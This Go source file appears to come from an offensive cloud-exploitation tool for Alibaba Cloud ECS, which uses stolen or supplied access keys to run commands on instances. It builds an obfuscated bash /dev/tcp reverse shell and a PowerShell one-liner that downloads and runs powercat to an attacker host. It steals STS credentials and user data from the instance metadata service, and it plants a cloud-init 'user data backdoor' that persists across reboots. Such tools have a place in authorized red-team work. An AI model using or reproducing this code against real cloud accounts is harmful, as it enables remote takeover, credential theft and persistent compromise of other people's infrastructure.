package aliecs

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"os"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/AlecAivazis/survey/v2"

	"github.com/teamssix/cf/pkg/util/errutil"

	"github.com/teamssix/cf/pkg/util/cmdutil"

	"github.com/aliyun/alibaba-cloud-sdk-go/services/ecs"
	"github.com/gookit/color"
	log "github.com/sirupsen/logrus"
)

var timeSleepSum int

func CreateCommand(region string, OSType string, command string, scriptType string) string {
	request := ecs.CreateCreateCommandRequest()
	request.Scheme = "https"
	request.Name = strconv.FormatInt(time.Now().Unix(), 10)
	if scriptType == "auto" {
		if OSType == "linux" {
			request.Type = "RunShellScript"
		} else {
			request.Type = "RunBatScript"
		}
	} else if scriptType == "sh" {
		request.Type = "RunShellScript"
	} else if scriptType == "bat" {
		request.Type = "RunBatScript"
	} else if scriptType == "ps" {
		request.Type = "RunPowerShellScript"
	}
	log.Debugln("执行命令 (Execute command): \n" + command)
	request.CommandContent = base64.StdEncoding.EncodeToString([]byte(command))
	response, err := ECSClient(region).CreateCommand(request)
	errutil.HandleErr(err)
	CommandId := response.CommandId
	log.Debugln("得到 CommandId 为 (CommandId value): " + CommandId)
	return CommandId
}

func DeleteCommand(region string, CommandId string) {
	request := ecs.CreateDeleteCommandRequest()
	request.Scheme = "https"
	request.CommandId = CommandId
	_, err := ECSClient(region).DeleteCommand(request)
	errutil.HandleErr(err)
	log.Debugln("删除 CommandId (Delete CommandId): " + CommandId)
}

func InvokeCommand(region string, OSType string, command string, scriptType string, specifiedInstanceId string) (string, string) {
	CommandId := CreateCommand(region, OSType, command, scriptType)
	request := ecs.CreateInvokeCommandRequest()
	request.Scheme = "https"
	request.CommandId = CommandId
	request.InstanceId = &[]string{specifiedInstanceId}
	response, err := ECSClient(region).InvokeCommand(request)
	errutil.HandleErr(err)
	InvokeId := response.InvokeId
	log.Debugln("得到 InvokeId 为 (InvokeId value): " + InvokeId)
	return CommandId, InvokeId
}

func DescribeInvocationResults(region string, CommandId string, InvokeId string, timeOut int) string {
	var output string
	timeSleep := 2
	timeSleepSum = timeSleepSum + timeSleep
	time.Sleep(time.Duration(timeSleep) * time.Second)
	request := ecs.CreateDescribeInvocationResultsRequest()
	request.Scheme = "https"
	request.InvokeId = InvokeId
	response, err := ECSClient(region).DescribeInvocationResults(request)
	errutil.HandleErr(err)
	InvokeRecordStatus := response.Invocation.InvocationResults.InvocationResult[0].InvokeRecordStatus
	if InvokeRecordStatus == "Finished" {
		output = response.Invocation.InvocationResults.InvocationResult[0].Output
		log.Debugln("命令执行结果 base64 编码值为 (The base64 encoded value of the command execution result is):\n" + output)
		DeleteCommand(region, CommandId)
	} else {
		if timeSleepSum > timeOut {
			log.Warnf("命令执行超时，如果想再次执行可以使用 -t 或 --timeOut 参数指定命令等待时间 (If you want to execute the command again, you can use the -t or --timeOut parameter to specify the waiting time)")
			os.Exit(0)
		} else {
			log.Debugf("命令执行结果为 %s，等待 %d 秒钟后再试 (Command execution result is %s, wait for %d seconds and try again)", InvokeRecordStatus, timeSleep, InvokeRecordStatus, timeSleep)
			output = DescribeInvocationResults(region, CommandId, InvokeId, timeOut)
		}
	}
	return output
}

func ECSExec(command string, commandFile string, scriptType string, specifiedInstanceId string, region string, batchCommand bool, userData bool, metaDataSTSToken bool, ecsFlushCache bool, lhost string, lport string, timeOut int, ecsExecAllRegions bool, userDataBackdoor string) {
	var InstancesList []Instances
	if ecsFlushCache == false {
		InstancesList = ReturnCacheInstanceList(specifiedInstanceId, region, "alibaba")
	} else {
		InstancesList = ReturnInstancesList(region, false, specifiedInstanceId, ecsExecAllRegions)
	}
	if len(InstancesList) == 0 {
		if specifiedInstanceId == "all" {
			log.Warnf("未发现实例，可以使用 --flushCache 刷新缓存后再试 (No instances found, You can use the --flushCache command to flush the cache and try again)")
		} else {
			log.Warnf("未找到 %s 实例的相关信息 (No information found about the %s instance)", specifiedInstanceId, specifiedInstanceId)
		}
	} else {
		if specifiedInstanceId == "all" {
			var (
				selectInstanceIdList []string
				selectInstanceId     string
			)
			selectInstanceIdList = append(selectInstanceIdList, "全部实例 (all instances)")
			for _, i := range InstancesList {
				selectInstanceIdList = append(selectInstanceIdList, fmt.Sprintf("%s (%s)", i.InstanceId, i.OSName))
			}
			sort.Strings(selectInstanceIdList)
			prompt := &survey.Select{
				Message: "选择一个实例 (Choose a instance): ",
				Options: selectInstanceIdList,
			}
			survey.AskOne(prompt, &selectInstanceId)
			for _, j := range InstancesList {
				if selectInstanceId != "all" {
					if selectInstanceId == fmt.Sprintf("%s (%s)", j.InstanceId, j.OSName) {
						InstancesList = nil
						InstancesList = append(InstancesList, j)
					}
				}
			}
		}
		var num = 0
		for _, i := range InstancesList {
			specifiedInstanceId := i.InstanceId
			if i.Status == "Running" {
				num = num + 1
				InstanceName := i.InstanceName
				region := i.RegionId
				OSType := i.OSType
				if userData == true {
					commandResult := getUserData(region, OSType, scriptType, specifiedInstanceId, timeOut, true)
					if commandResult == "" {
						fmt.Println("未找到用户数据 (User data not found)")
					} else if commandResult == "disabled" {
						fmt.Println("该实例禁止访问用户数据 (This instance disables access to user data)")
					} else {
						fmt.Println(commandResult)
					}
				} else if metaDataSTSToken == true {
					commandResult := getMetaDataSTSToken(region, OSType, scriptType, specifiedInstanceId, timeOut)
					if commandResult == "" {
						fmt.Println("未找到临时访问密钥 (STS Token not found)")
					} else if commandResult == "disabled" {
						fmt.Println("该实例禁止访问临时凭证 (This instance disables access to STS Token)")
					} else {
						fmt.Println(commandResult)
					}
				} else if userDataBackdoor != "" {
					UserDataBackdoor(i.RegionId, userDataBackdoor, specifiedInstanceId, timeOut, scriptType, i.OSType, i.Status)
				} else {
					if batchCommand == true {
						if OSType == "linux" {
							command = "whoami && id && hostname && ifconfig"
						} else {
							command = "whoami && hostname && ipconfig"
						}
					} else if lhost != "" {
						if OSType == "linux" {
							revShell := fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", lhost, lport)
							command = fmt.Sprintf("bash -c '{echo,%s}|{base64,-d}|{bash,-i}'", base64.StdEncoding.EncodeToString([]byte(revShell)))
						} else {
							command = fmt.Sprintf("powershell IEX (New-Object System.Net.Webclient).DownloadString('https://ghproxy.com/raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c %s -p %s -e cmd", lhost, lport)
						}
					} else if commandFile != "" {
						file, err := os.Open(commandFile)
						errutil.HandleErr(err)
						defer file.Close()
						contentByte, err := ioutil.ReadAll(file)
						errutil.HandleErr(err)
						content := string(contentByte)
						command = content[:len(content)-1]
					}
					if len(InstancesList) == 1 {
						color.Printf("\n<lightGreen>%s (%s) ></> %s\n\n", specifiedInstanceId, InstanceName, command)
					} else {
						color.Printf("\n<lightGreen>%d %s (%s) ></> %s\n\n", num, specifiedInstanceId, InstanceName, command)
					}
					commandResult := getExecResult(region, command, OSType, scriptType, specifiedInstanceId, timeOut)
					fmt.Println(commandResult)
				}
			}
		}
	}
}

func getExecResult(region string, command string, OSType string, scriptType string, specifiedInstanceId string, timeOut int) string {
	CommandId, InvokeId := InvokeCommand(region, OSType, command, scriptType, specifiedInstanceId)
	output := DescribeInvocationResults(region, CommandId, InvokeId, timeOut)
	var commandResult string
	if output == "DQo=" {
		commandResult = ""
	} else {
		commandResultByte, err := base64.StdEncoding.DecodeString(output)
		errutil.HandleErr(err)
		commandResult = string(commandResultByte)
	}
	return commandResult
}

func getUserData(region string, OSType string, scriptType string, specifiedInstanceId string, timeOut int, isPrint bool) string {
	var command string
	if OSType == "linux" {
		command = "curl -s http://100.100.100.200/latest/user-data/"
	} else {
		command = "Invoke-RestMethod http://100.100.100.200/latest/user-data/"
		scriptType = "ps"
	}
	commandResult := getExecResult(region, command, OSType, scriptType, specifiedInstanceId, timeOut)
	if strings.Contains(commandResult, "403 - Forbidden") {
		log.Debugln("元数据访问模式可能被设置成了加固模式，尝试获取 Token 访问 (The metadata access mode may have been set to hardened mode and is trying to get Token access)")
		if OSType == "linux" {
			command = "TOKEN=`curl -s -X PUT \"http://100.100.100.200/latest/api/token\" -H \"X-aliyun-ecs-metadata-token-ttl-seconds: 21600\"` && curl -s -H \"X-aliyun-ecs-metadata-token: $TOKEN\" http://100.100.100.200/latest/user-data/"
		} else {
			command = "$token = Invoke-RestMethod -Headers @{\"X-aliyun-ecs-metadata-token-ttl-seconds\" = \"21600\"} -Method PUT –Uri http://100.100.100.200/latest/api/token\nInvoke-RestMethod -Headers @{\"X-aliyun-ecs-metadata-token\" = $token} -Method GET -Uri http://100.100.100.200/latest/user-data/"
			scriptType = "ps"
		}
		commandResult = getExecResult(region, command, OSType, scriptType, specifiedInstanceId, timeOut)
		if strings.Contains(commandResult, "404 - Not Found") || strings.Contains(commandResult, "403 - Forbidden") {
			if isPrint {
				color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceId, command)
			}
			commandResult = "disabled"
		}
	} else if strings.Contains(commandResult, "404 - Not Found") {
		if isPrint {
			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceId, command)
		}
		commandResult = ""
	} else {
		if isPrint {
			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceId, command)
		}
	}
	return commandResult
}

func getMetaDataSTSToken(region string, OSType string, scriptType string, specifiedInstanceId string, timeOut int) string {
	var command string
	var commandResult string
	if OSType == "linux" {
		command = "curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/"
	} else {
		command = "Invoke-RestMethod http://100.100.100.200/latest/meta-data/ram/security-credentials/"
		scriptType = "ps"
	}
	roleName := getExecResult(region, command, OSType, scriptType, specifiedInstanceId, timeOut)

	if strings.Contains(roleName, "403 - Forbidden") {
		log.Debugln("元数据访问模式可能被设置成了加固模式，尝试获取 Token 访问 (The metadata access mode may have been set to hardened mode and is trying to get Token access)")
		if OSType == "linux" {
			command = "TOKEN=`curl -s -X PUT \"http://100.100.100.200/latest/api/token\" -H \"X-aliyun-ecs-metadata-token-ttl-seconds: 21600\"` && curl -s -H \"X-aliyun-ecs-metadata-token: $TOKEN\" http://100.100.100.200/latest/meta-data/ram/security-credentials/"
		} else {
			command = "$token = Invoke-RestMethod -Headers @{\"X-aliyun-ecs-metadata-token-ttl-seconds\" = \"21600\"} -Method PUT –Uri http://100.100.100.200/latest/api/token\nInvoke-RestMethod -Headers @{\"X-aliyun-ecs-metadata-token\" = $token} -Method GET -Uri http://100.100.100.200/latest/meta-data/ram/security-credentials/"
			scriptType = "ps"
		}
		roleName = getExecResult(region, command, OSType, scriptType, specifiedInstanceId, timeOut)
		if strings.Contains(roleName, "404 - Not Found") || strings.Contains(roleName, "403 - Forbidden") {
			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceId, command)
			commandResult = "disabled"
		} else {
			if OSType == "linux" {
				command = "curl -s -H \"X-aliyun-ecs-metadata-token: $TOKEN\" http://100.100.100.200/latest/meta-data/ram/security-credentials/" + roleName
			} else {
				command = "Invoke-RestMethod -Headers @{\"X-aliyun-ecs-metadata-token\" = $token} -Method GET -Uri http://100.100.100.200/latest/meta-data/ram/security-credentials/" + roleName
				scriptType = "ps"
			}
			color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceId, command)
			commandResult = getExecResult(region, command, OSType, scriptType, specifiedInstanceId, timeOut)
		}
	} else if strings.Contains(roleName, "404 - Not Found") {
		color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceId, command)
		commandResult = ""
	} else {
		if OSType == "linux" {
			command = "curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/" + roleName
		} else {
			command = "Invoke-RestMethod http://100.100.100.200/latest/meta-data/ram/security-credentials/" + roleName
			scriptType = "ps"
		}
		color.Printf("\n<lightGreen>%s ></> %s\n\n", specifiedInstanceId, command)
		commandResult = getExecResult(region, command, OSType, scriptType, specifiedInstanceId, timeOut)
	}
	return commandResult
}

func UserDataBackdoor(region string, command string, specifiedInstanceId string, timeOut int, scriptType string, OSType string, ecsStatus string) {
	var commandResult1 string
	if ecsStatus == "Running" {
		commandResult := getUserData(region, OSType, scriptType, specifiedInstanceId, timeOut, false)
		commandResult1 = commandResult
		if commandResult == "disabled" {
			log.Warnln("元数据拒绝访问，无法读取到用户数据 (Metadata Access Denied. Unable to retrieve user data.)")
			return
		}
		if commandResult != "" {
			var isSure bool
			prompt := &survey.Confirm{
				Message: "检测到目标机器已有用户数据，请在仔细权衡后再确认是否进行覆盖写入？(User data has been detected on the target machine. Please carefully consider and confirm whether you want to proceed with overwrite write?)",
				Default: false,
			}
			err := survey.AskOne(prompt, &isSure)
			errutil.HandleErr(err)
			if !isSure {
				log.Infoln("已中止操作 (The operation has been aborted.)")
				return
			}
		}
	}
	request := ecs.CreateModifyInstanceAttributeRequest()
	request.Scheme = "https"
	request.InstanceId = specifiedInstanceId
	userdata, _ := base64.StdEncoding.DecodeString("I2Nsb3VkLWNvbmZpZwpib290Y21kOgogIC0g")
	userdataStr := string(userdata)
	userdataStr = fmt.Sprintf("%s%s", userdataStr, command)
	userdataStr = base64.StdEncoding.EncodeToString([]byte(userdataStr))
	log.Debugln("待写入的用户数据 (User data to be written): ", userdataStr)
	request.UserData = userdataStr
	response, err := ECSClient(region).ModifyInstanceAttribute(request)
	errutil.HandleErr(err)
	commandResult := response.GetHttpStatus()
	if commandResult == 200 {
		if ecsStatus == "Running" {
			log.Infoln("覆盖写入成功 (Overwrite write successful.)")
			commandResult2 := getUserData(region, OSType, scriptType, specifiedInstanceId, timeOut, false)
			color.Printf("\n<lightGreen>原来的用户数据 (Original user data): </> \n%s\n", commandResult1)
			color.Printf("\n<lightGreen>现在的用户数据 (Current user data): </> \n%s\n\n", commandResult2)
		} else {
			log.Infoln("覆盖写入成功 (Overwrite write successful.)")
		}
		log.Infoln("用户数据后门会在实例重启后生效 (The user data backdoor will take effect after the instance is restarted.)")
	} else {
		log.Errorln("写入失败，权限不足 (Write failed, insufficient permissions.)")
	}
}

func ReturnCacheInstanceList(specifiedInstanceId string, region string, provider string) []Instances {
	var InstancesList []Instances
	data := cmdutil.ReadECSCache(provider)
	for _, v := range data {
		switch {
		case specifiedInstanceId != "all" && region != "all":
			if specifiedInstanceId == v.InstanceId && region == v.RegionId {
				obj := Instances{
					InstanceId:       v.InstanceId,
					InstanceName:     v.InstanceName,
					OSName:           v.OSName,
					OSType:           v.OSType,
					Status:           v.Status,
					PrivateIpAddress: v.PrivateIpAddress,
					PublicIpAddress:  v.PublicIpAddress,
					RegionId:         v.RegionId,
				}
				InstancesList = append(InstancesList, obj)
			}
		case specifiedInstanceId != "all" && region == "all":
			if specifiedInstanceId == v.InstanceId {
				obj := Instances{
					InstanceId:       v.InstanceId,
					InstanceName:     v.InstanceName,
					OSName:           v.OSName,
					OSType:           v.OSType,
					Status:           v.Status,
					PrivateIpAddress: v.PrivateIpAddress,
					PublicIpAddress:  v.PublicIpAddress,
					RegionId:         v.RegionId,
				}
				InstancesList = append(InstancesList, obj)
			}
		case specifiedInstanceId == "all" && region != "all":
			if region == v.RegionId {
				obj := Instances{
					InstanceId:       v.InstanceId,
					InstanceName:     v.InstanceName,
					OSName:           v.OSName,
					OSType:           v.OSType,
					Status:           v.Status,
					PrivateIpAddress: v.PrivateIpAddress,
					PublicIpAddress:  v.PublicIpAddress,
					RegionId:         v.RegionId,
				}
				InstancesList = append(InstancesList, obj)
			}
		case specifiedInstanceId == "all" && region == "all":
			obj := Instances{
				InstanceId:       v.InstanceId,
				InstanceName:     v.InstanceName,
				OSName:           v.OSName,
				OSType:           v.OSType,
				Status:           v.Status,
				PrivateIpAddress: v.PrivateIpAddress,
				PublicIpAddress:  v.PublicIpAddress,
				RegionId:         v.RegionId,
			}
			InstancesList = append(InstancesList, obj)
		}
	}
	return InstancesList
}
